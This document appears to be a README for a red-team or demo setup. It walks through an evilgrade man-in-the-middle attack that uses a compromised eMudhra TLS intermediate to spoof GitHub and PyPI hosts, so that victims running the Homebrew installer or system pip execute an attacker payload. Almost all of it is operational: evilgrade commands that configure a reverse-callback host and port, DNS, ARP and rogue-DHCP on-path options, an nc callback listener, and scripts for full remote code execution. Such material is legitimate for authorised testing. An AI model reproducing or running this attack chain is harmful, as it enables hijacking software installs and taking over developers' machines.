# Running the eMudhra MITM through evilgrade (interactive)

This is the Homebrew example driven by evilgrade's own shell, step by step, the
way you would in an engagement. pip and git follow the same pattern (swap the
module).

## 0. Background (what makes this work)

In Oct 2026, eight eMudhra TLS intermediates had recoverable private keys and
were revoked; Apple blocks them since 19 Oct — **but only in Secure Transport**
(Safari/Mail and apps on Apple's frameworks). Tools that validate against
`/etc/ssl/cert.pem` — `/usr/bin/curl`, system `/usr/bin/python3`, OpenSSL-backed
`git` — still trust the intermediate's root (`AAA Certificate Services`, present
in `cert.pem`). Homebrew's install one-liner runs through `curl`, so it is
exploitable. The repo ships the real compromised intermediate
(`certs/emudhra_authorized/CN=EM DV TLS CA - G3C,...`, SHA-256 `62:B7:F9:86…`,
matching Apple's block list) plus a leaf for the GitHub/PyPI hosts
(`certs/emudhra_mitm/`).

## 1. Start evilgrade

```sh
# evilgrade's webserver needs IO::Socket::SSL, which is in the SYSTEM perl.
cd /Users/famato/dev/evilgrade
sudo PERL5LIB=.:./isrcore /usr/bin/perl ./evilgrade      # sudo only to bind :443
```

## 2. Configure the Homebrew module and the eMudhra cert

```
evilgrade> set sslcert certs/emudhra_mitm      # eMudhra-signed cert for the GitHub/PyPI hosts
evilgrade> configure homebrew_update
evilgrade(homebrew_update)> set lhost 10.0.0.5     # your reverse-callback host
evilgrade(homebrew_update)> set lport 4444
evilgrade(homebrew_update)> set enable 1
evilgrade(homebrew_update)> configure              # (bare) back to top level
evilgrade> show vhosts                              # confirm raw.githubusercontent.com etc.
evilgrade> start
```

`start` launches the webserver (:443) and the DNS server. Point the victim's
DNS at this host (evilgrade's DNS answers `raw.githubusercontent.com` with your
IP), or use ARP/rogue-DHCP/rogue-Wi-Fi to get on-path. The victim must trust the
eMudhra CA (corporate-installed, or the still-trusting `cert.pem` as above).

## 3. Victim runs the genuine Homebrew installer

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

curl fetches evilgrade's `install.sh` (TLS validates against the eMudhra cert),
bash runs it → your payload executes as the victim user.

## 4. pip and git (same idea)

```
evilgrade> configure pypi_update
evilgrade(pypi_update)> set enable 1
evilgrade(pypi_update)> configure
evilgrade> start
```
Victim (must use the **system** python, not Homebrew's):
```sh
/usr/bin/python3 -m pip install --index-url https://pypi.org/simple/ evilpkg
```

git: Apple git defaults to Secure Transport (rejects); an OpenSSL-backed git, or
`git -c http.sslBackend=openssl -c http.sslCAInfo=/etc/ssl/cert.pem`, accepts the
eMudhra cert. A clone is transport tampering; RCE follows from a build step or a
malicious submodule.

## Two-console demo (evilgrade in one, victim in another)

This is the cleanest way to show it live: evilgrade stays up in console A with
its request log visible; you fire the victim from console B.

**Console A — evilgrade (stays running):**
```sh
# wrapper = system perl + sanitized env (avoids the perl ABI mismatch)
./demo/emudhra_mitm/console.sh 9443       # or no arg + sudo for :443
# then inside the shell:
set sslport 9443
set sslcert certs/emudhra_mitm
configure homebrew_update
set lhost 127.0.0.1
set lport 4444
set enable 1
configure
# (enable pypi_update too if you want the pip case)
configure pypi_update
set enable 1
configure
start
```

**Console C (optional) — callback listener:**
```sh
nc -l 4444
```

**Console B — victim (does NOT touch evilgrade):**
```sh
./demo/emudhra_mitm/victim_brew.sh 9443    # Homebrew case
./demo/emudhra_mitm/victim_pip.sh  9443    # pip case
```
Pass the same port you gave evilgrade (omit for 443).

### Re-running / cleanup

- **victim_*.sh** can be re-run as many times as you want — they don't start or
  stop evilgrade, they just delete their own `/tmp/OWNED_BY_*` and re-fire.
- The **run_*.sh** (standalone) now free their target port automatically before
  starting, so back-to-back runs work.
- If a run ever reports **"FAILED to bind"** or the victim gets **HTTP 000 /
  Empty reply**, a stale forked webserver is holding the port. Run:
  ```sh
  ./demo/emudhra_mitm/cleanup.sh
  ```
  It kills serve.pl + forked webservers + the `nc` listener and removes the
  proof files. (It also stops an interactive evilgrade console, so only run it
  when you want everything down.)

## Non-interactive check (no TTY needed)

evilgrade's shell is `Term::Shell` and needs a real terminal. To verify the
exact same webserver + modules + cert without a TTY, the demo runners drive
`serve.pl`:

```sh
./demo/emudhra_mitm/run_brew.sh     # full RCE through evilgrade
./demo/emudhra_mitm/run_pip.sh      # transport + setup.py RCE
./demo/emudhra_mitm/run_git.sh      # transport check + honest git caveat
```
